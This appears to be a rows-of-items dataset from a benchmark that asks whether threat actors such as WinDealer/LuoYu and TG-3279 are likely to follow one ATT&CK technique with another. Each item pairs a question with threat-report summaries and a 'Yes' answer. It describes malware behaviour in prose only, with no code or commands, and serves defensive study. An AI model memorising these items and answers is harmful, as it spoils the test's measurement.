834,209,209-Command and Control-T1071-Application Layer Protocol,"After staging and encrypting stolen data in the %TEMP% directory as "".a"" files during the Exfiltration phase, is it likely that WinDealer will use UDP port 6999 and TCP port 55556 for command and control communications, including sending an encrypted AES key to the C2 server?","Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
835,209,209-Command and Control-T1571-Non-Standard Port,Is it likely that WinDealer will steal information from SNS applications and encrypt this data using AES before it proceeds to communicate with C2 servers using non-standard ports such as UDP port 6999 or TCP port 55556?,"Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
836,209,209-Command and Control-T1573-Encrypted Channel,"After processing and encrypting stolen data as "".a"" files in the %TEMP% directory during the exfiltration phase, is it likely that WinDealer will communicate with C2 servers using an AES key encrypted with RSA as part of its command and control activities?","Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
837,209,209-Command and Control-T1095-Non-Application Layer Protocol,"After WinDealer collects and processes data from USB memory, documents, desktop items, recycle bin contents, and SNS application folders into "".a"" files stored in the %TEMP% directory, is it likely that the malware will communicate with C2 servers using UDP port 6999 or TCP port 55556 before exfiltrating the processed and encrypted data to the C2 server?","Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
838,209,209-Discovery-T1016-System Network Configuration Discovery,"After executing upon launch by reading its configuration file and loading a DLL module into memory, is WinDealer likely to discover information about the infected PC and network configuration before processing and staging stolen data in a folder under %TEMP% and encrypting it with AES for exfiltration?","Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
842,209,209-Collection-T1025-Data from Removable Media,"After discovering information about the infected PC and network configuration and staging encrypted stolen data in the %TEMP% folder, is it likely that WinDealer will collect data from removable media and target relevant folders before exfiltrating the processed and encrypted data to the C2 server?","Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
843,209,209-Collection-T1074-Data Staged,"After discovering information about the infected PC and network configuration and encrypting it with AES, is it likely that WinDealer will process the collected data into "".a"" files while categorizing them into different directories for staging?","Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
844,209,209-Exfiltration-T1041-Exfiltration Over C2 Channel,"After collecting data from SNS application folders and other targeted directories to process them into "".a"" files stored in categorized directories, is WinDealer likely to stage the data in the %TEMP% directory and encrypt it before exfiltrating it to a C2 server using the communication channels over UDP port 6999 or TCP port 55556?","Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
845,21,21-Privilege Escalation-T1068-Exploitation for Privilege Escalation,"After executing malicious code on a local or remote system, is it likely that attackers will ensure persistence within the target network before using increased privileges to spread to other systems or gain access to strategic goals?",Privilege Escalation: The escalation of privileges is often needed to install malware or persistence points. Increased privileges are sometimes also required to be able to spread to other systems or gain access to the strategic goals (e.g. data).,"Initial Access: The initial access phase is the starting point for all subsequent phases of an attack. It includes the initial contact with the attack target and compromising the so-called 'patient zero.'
Execution: The execution of malicious code on a local or remote system primarily takes place in the initial access and lateral movement phases. The next phase cannot be reached without execution of code controlled by the attacker. Execution is thus one of the most important prerequisites for the further development of the attack and for spreading across the target network.
Persistence: Persistence points within the target network ensure ongoing access to the compromised network. The more important the target is to the adversary, the more effort is put into persistence points for long-time access to the network.
Defense Evasion: Bypassing defense and detection mechanisms, e.g. by turning off the firewall at the endpoint or deleting log data, is one of the tactical goals that threat actors use in every other phase of their mission to either conceal their presence or bypass detection mechanisms.
Credential Access: Valid credentials play a key role for attackers. Firstly, it enables access to systems with legitimate credentials and lateral movement within the target network. Secondly, it grants access to the data that the attackers want. Furthermore, reusing credentials enables attackers to conduct an attack using few resources because no exploits have to be written, acquired or employed in any other way.
Discovery: Exploration within the target network is required to locate systems, users and data relevant to the mission.
Lateral Movement: This refers to moving across a network to the relevant data for the mission. This is often accompanied by the execution phase and the installation of further persistence points.
Collection: The relevant data is collected.
Command and Control: The command & control channel is the attacker's means of communication to keep the compromised target infrastructure under his control. If the attacker loses this channel, the attack is literally stopped. As such attackers often establish multiple command & control channels to ensure access.
Exfiltration: This is the final phase required to successfully complete the mission and involves exfiltrating the relevant data.",Yes,security-report-2019
846,21,21-Defense Evasion-T1562-Impair Defenses,"After escalating privileges to gain administrative control over the target network, is it likely that threat actors will attempt to bypass detection mechanisms to impair defenses before acquiring valid credentials for legitimate system access?","Defense Evasion: Bypassing defense and detection mechanisms, e.g. by turning off the firewall at the endpoint or deleting log data, is one of the tactical goals that threat actors use in every other phase of their mission to either conceal their presence or bypass detection mechanisms.","Initial Access: The initial access phase is the starting point for all subsequent phases of an attack. It includes the initial contact with the attack target and compromising the so-called 'patient zero.'
Execution: The execution of malicious code on a local or remote system primarily takes place in the initial access and lateral movement phases. The next phase cannot be reached without execution of code controlled by the attacker. Execution is thus one of the most important prerequisites for the further development of the attack and for spreading across the target network.
Persistence: Persistence points within the target network ensure ongoing access to the compromised network. The more important the target is to the adversary, the more effort is put into persistence points for long-time access to the network.
Privilege Escalation: The escalation of privileges is often needed to install malware or persistence points. Increased privileges are sometimes also required to be able to spread to other systems or gain access to the strategic goals (e.g. data).
Credential Access: Valid credentials play a key role for attackers. Firstly, it enables access to systems with legitimate credentials and lateral movement within the target network. Secondly, it grants access to the data that the attackers want. Furthermore, reusing credentials enables attackers to conduct an attack using few resources because no exploits have to be written, acquired or employed in any other way.
Discovery: Exploration within the target network is required to locate systems, users and data relevant to the mission.
Lateral Movement: This refers to moving across a network to the relevant data for the mission. This is often accompanied by the execution phase and the installation of further persistence points.
Collection: The relevant data is collected.
Command and Control: The command & control channel is the attacker's means of communication to keep the compromised target infrastructure under his control. If the attacker loses this channel, the attack is literally stopped. As such attackers often establish multiple command & control channels to ensure access.
Exfiltration: This is the final phase required to successfully complete the mission and involves exfiltrating the relevant data.",Yes,security-report-2019
847,21,21-Lateral Movement-T1210-Exploitation of Remote Services,"After attackers gain knowledge of systems, users, and data relevant to their mission through the discovery phase, is it likely they will exploit remote services to achieve lateral movement before installing additional persistence points on new systems?",Lateral Movement: This refers to moving across a network to the relevant data for the mission. This is often accompanied by the execution phase and the installation of further persistence points.,"Initial Access: The initial access phase is the starting point for all subsequent phases of an attack. It includes the initial contact with the attack target and compromising the so-called 'patient zero.'
Execution: The execution of malicious code on a local or remote system primarily takes place in the initial access and lateral movement phases. The next phase cannot be reached without execution of code controlled by the attacker. Execution is thus one of the most important prerequisites for the further development of the attack and for spreading across the target network.
Persistence: Persistence points within the target network ensure ongoing access to the compromised network. The more important the target is to the adversary, the more effort is put into persistence points for long-time access to the network.
Privilege Escalation: The escalation of privileges is often needed to install malware or persistence points. Increased privileges are sometimes also required to be able to spread to other systems or gain access to the strategic goals (e.g. data).
Defense Evasion: Bypassing defense and detection mechanisms, e.g. by turning off the firewall at the endpoint or deleting log data, is one of the tactical goals that threat actors use in every other phase of their mission to either conceal their presence or bypass detection mechanisms.
Credential Access: Valid credentials play a key role for attackers. Firstly, it enables access to systems with legitimate credentials and lateral movement within the target network. Secondly, it grants access to the data that the attackers want. Furthermore, reusing credentials enables attackers to conduct an attack using few resources because no exploits have to be written, acquired or employed in any other way.
Discovery: Exploration within the target network is required to locate systems, users and data relevant to the mission.
Collection: The relevant data is collected.
Command and Control: The command & control channel is the attacker's means of communication to keep the compromised target infrastructure under his control. If the attacker loses this channel, the attack is literally stopped. As such attackers often establish multiple command & control channels to ensure access.
Exfiltration: This is the final phase required to successfully complete the mission and involves exfiltrating the relevant data.",Yes,security-report-2019
848,21,21-Lateral Movement-T1534-Internal Spearphishing,"After persistence is established through long-term access points within the target network, is it likely that execution of malicious code will occur as part of reaching the lateral movement phase by employing internal spearphishing techniques?",Lateral Movement: This refers to moving across a network to the relevant data for the mission. This is often accompanied by the execution phase and the installation of further persistence points.,"Initial Access: The initial access phase is the starting point for all subsequent phases of an attack. It includes the initial contact with the attack target and compromising the so-called 'patient zero.'
Execution: The execution of malicious code on a local or remote system primarily takes place in the initial access and lateral movement phases. The next phase cannot be reached without execution of code controlled by the attacker. Execution is thus one of the most important prerequisites for the further development of the attack and for spreading across the target network.
Persistence: Persistence points within the target network ensure ongoing access to the compromised network. The more important the target is to the adversary, the more effort is put into persistence points for long-time access to the network.
Privilege Escalation: The escalation of privileges is often needed to install malware or persistence points. Increased privileges are sometimes also required to be able to spread to other systems or gain access to the strategic goals (e.g. data).
Defense Evasion: Bypassing defense and detection mechanisms, e.g. by turning off the firewall at the endpoint or deleting log data, is one of the tactical goals that threat actors use in every other phase of their mission to either conceal their presence or bypass detection mechanisms.
Credential Access: Valid credentials play a key role for attackers. Firstly, it enables access to systems with legitimate credentials and lateral movement within the target network. Secondly, it grants access to the data that the attackers want. Furthermore, reusing credentials enables attackers to conduct an attack using few resources because no exploits have to be written, acquired or employed in any other way.
Discovery: Exploration within the target network is required to locate systems, users and data relevant to the mission.
Collection: The relevant data is collected.
Command and Control: The command & control channel is the attacker's means of communication to keep the compromised target infrastructure under his control. If the attacker loses this channel, the attack is literally stopped. As such attackers often establish multiple command & control channels to ensure access.
Exfiltration: This is the final phase required to successfully complete the mission and involves exfiltrating the relevant data.",Yes,security-report-2019
850,21,21-Command and Control-T1104-Multi-Stage Channels,"After exploring the target network to locate systems, users, and data, is it likely that the attacker will establish multi-stage command and control channels to maintain control of the compromised target infrastructure before performing exfiltration of the collected data?","Command and Control: The command & control channel is the attacker's means of communication to keep the compromised target infrastructure under his control. If the attacker loses this channel, the attack is literally stopped. As such attackers often establish multiple command & control channels to ensure access.","Initial Access: The initial access phase is the starting point for all subsequent phases of an attack. It includes the initial contact with the attack target and compromising the so-called 'patient zero.'
Execution: The execution of malicious code on a local or remote system primarily takes place in the initial access and lateral movement phases. The next phase cannot be reached without execution of code controlled by the attacker. Execution is thus one of the most important prerequisites for the further development of the attack and for spreading across the target network.
Persistence: Persistence points within the target network ensure ongoing access to the compromised network. The more important the target is to the adversary, the more effort is put into persistence points for long-time access to the network.
Privilege Escalation: The escalation of privileges is often needed to install malware or persistence points. Increased privileges are sometimes also required to be able to spread to other systems or gain access to the strategic goals (e.g. data).
Defense Evasion: Bypassing defense and detection mechanisms, e.g. by turning off the firewall at the endpoint or deleting log data, is one of the tactical goals that threat actors use in every other phase of their mission to either conceal their presence or bypass detection mechanisms.
Credential Access: Valid credentials play a key role for attackers. Firstly, it enables access to systems with legitimate credentials and lateral movement within the target network. Secondly, it grants access to the data that the attackers want. Furthermore, reusing credentials enables attackers to conduct an attack using few resources because no exploits have to be written, acquired or employed in any other way.
Discovery: Exploration within the target network is required to locate systems, users and data relevant to the mission.
Lateral Movement: This refers to moving across a network to the relevant data for the mission. This is often accompanied by the execution phase and the installation of further persistence points.
Collection: The relevant data is collected.
Exfiltration: This is the final phase required to successfully complete the mission and involves exfiltrating the relevant data.",Yes,security-report-2019
854,210,210-Resource Development-T1584-Compromise Infrastructure,"After performing reconnaissance on targets via open source research and network scanning, is it likely that TG-3279 will compromise infrastructure by cloning domain registration information from legitimate companies like Google or Microsoft before gaining initial access using tools such as 's' and 'rdp_crk' for scanning and exploiting targets?","Resource Development: TG-3279 reuses network infrastructure between attacks, sharing IP addresses by multiple domain names. Domain registration information tends to be unique, sometimes using famous names or appearing as jokes, often cloned from legitimate companies like Google or Microsoft.","Reconnaissance: Threat Group-3279 (TG-3279) performs reconnaissance on targets via open source research and network scanning.
Initial Access: TG-3279 uses a port scanning tool named 's' and an RDP brute force tool named 'rdp_crk', which may be used to scan and exploit targets.
Persistence: TG-3279 leverages optionally loaded DLLs to establish persistence for the Conpee plugin framework, using a method that does not require modifying the Windows Registry or startup items.
Privilege Escalation: TG-3279 installs tools by compromising the account credentials of users with administrator privileges.
Defense Evasion: TG-3279's command and control (C2) communication often takes place over port 443 but is not HTTPS traffic. The traffic appears to be part of a larger framework named PATX. The C2 communications include IP calculations and domain name parking to complicate investigations.
Credential Access: TG-3279 actors strive to access network and system administrators' accounts to gain the most access to the target organization.
Lateral Movement: After initial exploitation, TG-3279 relies on a few key hosts to act as beachheads running the Conpee or Etso tools. TG-3279 then adds scheduled system tasks to other key resources within an organization to use compromised credentials gathered from pwdump6.
Command and Control: TG-3279 C2 communication often takes place over port 443 but is not HTTPS traffic. It includes IP calculations and domain name parking to complicate investigations.
Others: TG-3279 has been active since 2009 and is associated with the China Cracking Group. The personas Laurentiu Moon and Sincoder are believed to be TG-3279 actors. The group's focus is on collecting video game source code to crack games for free use, develop tools to cheat at the games, or use the source code for competing products. TG-3279 has been observed using tools such as Conpee, a modular plugin-based RAT framework, and other tools authored by Sincoder. TG-3279 has also been observed using popular public tools like pwdump6. The group has been observed compromising video game companies and is likely to continue operations for the foreseeable future. There are similarities between TG-3279 and TG-2633, also known as Winnti, but no strong link has been established between the groups.",Yes,group-3279-targets-the-video-game-industry
856,210,210-Privilege Escalation-T1078-Valid Accounts,"After leveraging optionally loaded DLLs to establish persistence for the Conpee plugin framework without modifying the Windows Registry or startup items, is TG-3279 likely to compromise account credentials belonging to users with administrator privileges before installing tools?",Privilege Escalation: TG-3279 installs tools by compromising the account credentials of users with administrator privileges.,"Reconnaissance: Threat Group-3279 (TG-3279) performs reconnaissance on targets via open source research and network scanning.
Resource Development: TG-3279 reuses network infrastructure between attacks, sharing IP addresses by multiple domain names. Domain registration information tends to be unique, sometimes using famous names or appearing as jokes, often cloned from legitimate companies like Google or Microsoft.
Initial Access: TG-3279 uses a port scanning tool named 's' and an RDP brute force tool named 'rdp_crk', which may be used to scan and exploit targets.
Persistence: TG-3279 leverages optionally loaded DLLs to establish persistence for the Conpee plugin framework, using a method that does not require modifying the Windows Registry or startup items.
Defense Evasion: TG-3279's command and control (C2) communication often takes place over port 443 but is not HTTPS traffic. The traffic appears to be part of a larger framework named PATX. The C2 communications include IP calculations and domain name parking to complicate investigations.
Credential Access: TG-3279 actors strive to access network and system administrators' accounts to gain the most access to the target organization.
Lateral Movement: After initial exploitation, TG-3279 relies on a few key hosts to act as beachheads running the Conpee or Etso tools. TG-3279 then adds scheduled system tasks to other key resources within an organization to use compromised credentials gathered from pwdump6.
Command and Control: TG-3279 C2 communication often takes place over port 443 but is not HTTPS traffic. It includes IP calculations and domain name parking to complicate investigations.
Others: TG-3279 has been active since 2009 and is associated with the China Cracking Group. The personas Laurentiu Moon and Sincoder are believed to be TG-3279 actors. The group's focus is on collecting video game source code to crack games for free use, develop tools to cheat at the games, or use the source code for competing products. TG-3279 has been observed using tools such as Conpee, a modular plugin-based RAT framework, and other tools authored by Sincoder. TG-3279 has also been observed using popular public tools like pwdump6. The group has been observed compromising video game companies and is likely to continue operations for the foreseeable future. There are similarities between TG-3279 and TG-2633, also known as Winnti, but no strong link has been established between the groups.",Yes,group-3279-targets-the-video-game-industry
